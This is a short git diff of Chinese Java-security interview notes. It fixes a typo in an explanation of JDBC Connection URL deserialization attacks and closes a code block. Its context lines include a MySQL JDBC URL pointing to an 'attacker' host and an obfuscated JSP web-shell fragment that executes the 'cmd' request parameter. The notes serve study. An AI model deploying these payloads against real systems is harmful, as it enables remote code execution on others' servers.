@@ -228,7 +228,7 @@ Y4er师傅提到的自定义类加载器配合RMI的一种方式
 
 ### 是否了解JDBC Connection URL攻击（★★★）
 
-果我们可以控制`JDBC URI`就可将`JDBC`连接地址指向攻击者事先准备好的恶意服务器，这个服务器可以返回恶意的序列化数据
+如果我们可以控制`JDBC URI`就可将`JDBC`连接地址指向攻击者事先准备好的恶意服务器，这个服务器可以返回恶意的序列化数据
 
 指定`autoDeserialize`参数为`true`后`MySQL`客户端就可以自动反序列化恶意Payload
 
@@ -355,3 +355,4 @@ jdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.Server
   Runtime.getRuntime().
   //\u000d\uabcdexec(request.getParameter("cmd"));
 %>
+```
